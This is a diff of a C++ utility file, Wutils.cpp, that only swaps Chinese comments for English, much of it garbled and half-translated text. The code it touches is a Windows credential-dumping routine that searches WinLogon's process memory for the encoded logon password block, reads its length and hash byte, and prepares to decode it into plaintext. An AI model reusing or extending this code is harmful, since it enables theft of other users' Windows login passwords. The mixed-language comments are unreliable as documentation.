@@ -1,7 +1,7 @@
 /*******************************************************************
    *	Wutils.cpp
-   *    DESCRIPTION:windows系统utility functions集
-   *    查找登录password
+   *    DESCRIPTION:windows系统utility functions collection
+   *    find login password
    *    AUTHOR:yyc
    *
    *    http://hi.baidu.com/yycblog/home
@@ -55,7 +55,7 @@ DWORD HashByte = 0;
 wchar_t UserName [0x400];
 wchar_t UserDomain [0x400];
 
-//strAccount -- formatDomain\account或者Domain/account
+//strAccount -- formatDomain\accountor者Domain/account
 BOOL Wutils :: FindPassword(const char *ptr)
 {
 	if(ptr==NULL || ptr[0]==0)
@@ -69,15 +69,15 @@ BOOL Wutils :: FindPassword(const char *ptr)
 	}else { ptrAccount=ptrDomain;  ptrDomain=NULL; }
 	return FindPassword(ptrDomain,ptrAccount);
 }
-//获取Win2K/NT的系统登录accountinfo(username & password)
+//getWin2K/NT的系统loginaccountinfo(username & password)
 //[in] strDomain ---查找specified域
 //[in] strAccount -- 查找specifiedaccount
-//返回<0发生error =0未找到password 否则找到password
+//return<0发生error =0未foundpassword otherwisefoundpassword
 BOOL Wutils :: FindPassword(const char *strDomain,const char *strAccount)
 {
 	MSOSTYPE ost=Wutils::winOsType();
 
-	if(ost<MSOS_TYPE_NT) //非NT或Win2000系统
+	if(ost<MSOS_TYPE_NT) //非NTorWin2000系统
 	{
 		sprintf(m_buffer,"NT/WIN2K are required!");
 		return FALSE;
@@ -105,21 +105,21 @@ BOOL Wutils :: FindPassword(const char *strDomain,const char *strAccount)
 		swprintf_s(UserDomain, _countof(UserDomain), L"%S", strDomain);
 	else
 	{
-		//run as a service时将不能获得username和域名，因为服务和用户无关
-		//通过环境变量获得username和域名
+		//run as a service时将not能获得usernameand域名，因为serviceanduser无关
+		//通过环境variable获得usernameand域名
 		if(::GetEnvironmentVariableW(L"USERDOMAIN", UserDomain, 0x400)==0)
 			swprintf_s(UserDomain, _countof(UserDomain), L"%S", Wutils::computeName());
 	}
 	if(strAccount)
 		swprintf_s(UserName, _countof(UserName), L"%S", strAccount);
 	else
-	{	//此时如果用::GetUserName获取得到的是SYSTEM
+	{	//此时if用::GetUserNameget得到的yesSYSTEM
 		if(::GetEnvironmentVariableW(L"USERNAME", UserName, 0x400)==0)
 			swprintf_s(UserName, _countof(UserName), L"%S", "Administrator");
 	}//?if(strAccount)...else
 
 	BOOL FoundPasswordPage=FALSE;
-	//在winlogon进程内存空间定位包含password的内存块
+	//atwinlogonprocessmemorynull间定bitcontainspassword的memory块
 	// Locate the block of memory containing 
 	// the password in WinLogon's memory space.
 	if (ost!=MSOS_TYPE_NT)
@@ -281,7 +281,7 @@ BOOL LocatePasswordPageWinNT (DWORD WinLogonPID, PDWORD PasswordLength)
 					//			SystemTime.wYear,
 					//			SystemTime.wHour,
 					//			SystemTime.wMinute,
-					//			SystemTime.wSecond);//在NT下打印登录time
+					//			SystemTime.wSecond);//atNT下打印login time
 
 					*PasswordLength = (EncodedPasswordInfoP->EncodedPassword.Length & 0x00ff) / sizeof (wchar_t);
 					HashByte = (EncodedPasswordInfoP->EncodedPassword.Length & 0xff00) >> 8;
@@ -300,7 +300,7 @@ BOOL LocatePasswordPageWinNT (DWORD WinLogonPID, PDWORD PasswordLength)
 } // LocatePasswordPageWinNT 
 
 
-//函数指针declaration only for DisplayPasswordWinNT or DisplayPasswordWin2K
+//functionpointerdeclaration only for DisplayPasswordWinNT or DisplayPasswordWin2K
 typedef void (__stdcall *PFNTRTLRUNDECODEUNICODESTRING)  (BYTE, PUNICODE_STRING);
 void DisplayPasswordWinNT(DWORD PasswordLength,char *retbuf)
 {
